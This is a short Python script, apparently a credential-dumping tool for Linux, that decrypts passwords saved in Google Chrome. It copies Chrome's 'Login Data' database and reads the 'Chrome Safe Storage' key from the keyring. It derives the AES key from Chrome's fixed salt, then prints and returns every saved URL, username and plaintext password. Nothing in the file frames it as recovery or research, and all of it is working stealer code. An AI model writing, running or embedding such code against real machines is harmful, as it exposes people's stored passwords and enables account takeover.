from shutil import copy
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
import sqlite3
from os import unlink
from getpass import getuser
import uuid
import secretstorage
import pprint

class ChromePasswordCrawler:
  def __init__(self):
    self.username = getuser()
    self.uuid = uuid.uuid1()
    self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
    self.getPasswords()

  def clean(self, x):
    return x[:-x[-1]].decode('utf8')

  def getMasterKey(self):
    bus = secretstorage.dbus_init()
    collection = secretstorage.get_default_collection(bus)
    for item in collection.get_all_items():
        if item.get_label() == 'Chrome Safe Storage':
            MY_PASS = item.get_secret()
            break
    salt = b'saltysalt'
    iv = b' ' * 16
    length = 16
    iterations = 1
    key = PBKDF2(MY_PASS, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    return cipher

  def getPasswords(self):
      copy(self.dbpath + "Login Data", "Login Data.db")
      conn = sqlite3.connect("Login Data.db")
      cursor = conn.cursor()
      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
      self.loginInfo = cursor.fetchall()
      conn.close()
      unlink("Login Data.db")


  def decryptPasswords(self):
      if len(self.loginInfo) == 0:
        self.getPasswords()
      crackedpwds = []
      for result in self.loginInfo:
          url = result[0]
          if len(url) < 1:
              continue
          username = result[1]
          encrypted_password = result[2]
          encrypted_password = encrypted_password[3:]
          password = self.clean(self.getMasterKey().decrypt(encrypted_password))
          pwd = { "url": url, "username": username, "password": password }
          pprint.pprint(pwd, sort_dicts=False)
          print("")
          crackedpwds.append(pwd)
      return crackedpwds